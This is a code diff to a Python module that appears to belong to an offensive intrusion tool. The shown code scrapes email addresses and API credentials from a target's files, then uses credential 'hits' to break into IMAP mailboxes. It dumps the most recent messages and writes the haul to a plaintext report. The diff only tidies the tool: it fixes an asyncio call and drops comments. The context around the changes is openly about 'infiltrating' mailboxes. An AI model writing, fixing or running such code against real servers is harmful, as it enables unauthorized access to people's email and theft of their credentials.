@@ -4,6 +4,7 @@ import json
 import time
 import ssl
 import imaplib
+import asyncio
 import urllib.request
 
 _ssl_context = ssl.create_default_context()
@@ -37,7 +38,7 @@ def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
         status, messages = mail.search(None, 'ALL')
         if status == 'OK':
             id_list = messages[0].split()
-            recent_ids = id_list[-10:] if len(id_list) >= 10 else id_list # Grab recent 10 high-value messages
+            recent_ids = id_list[-10:] if len(id_list) >= 10 else id_list
             
             for msg_id in recent_ids:
                 res, msg_data = mail.fetch(msg_id, '(RFC822.SIZE)')
@@ -87,12 +88,10 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
                             with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                 content = f.read()
                                 
-                                # Extract emails
                                 for match in email_regex.findall(content):
                                     if not any(ext in match.lower() for ext in ['.png', '.jpg', '.svg', 'example.com']):
                                         discovered_emails.add(match)
                                         
-                                # Extract inline API credentials / secrets
                                 for cred in credential_regex.findall(content):
                                     if cred not in discovered_credentials:
                                         discovered_credentials.append(cred)
@@ -100,7 +99,7 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
                         except Exception:
                             pass
 
-    # 2. Live IMAP Infiltrator (If verified credential hits exist from engine)
+    # 2. Live IMAP Infiltrator (If verified credential hits exist)
     if verified_hits:
         for hit in verified_hits:
             if hit.get("type") == "IMAP":
@@ -110,7 +109,7 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
                 use_ssl = (port in [993, 465])
                 
                 print(f" \033[93m[*] Infiltrating mailbox for {user} on :{port}...\033[0m")
-                success, result = await import('asyncio').to_thread(
+                success, result = await asyncio.to_thread(
                     dump_imap_mailbox_sync, target_host, port, user, password, use_ssl
                 )
                 
@@ -121,7 +120,6 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
 
     print(f" \033[92m[+] Intelligence sweep complete. Harvested unique emails: {len(discovered_emails)}\033[0m")
     
-    # Save extracted intelligence to plaintext report
     os.makedirs("reports", exist_ok=True)
     report_path = "reports/intelligence_harvest.txt"
     with open(report_path, "w") as out:
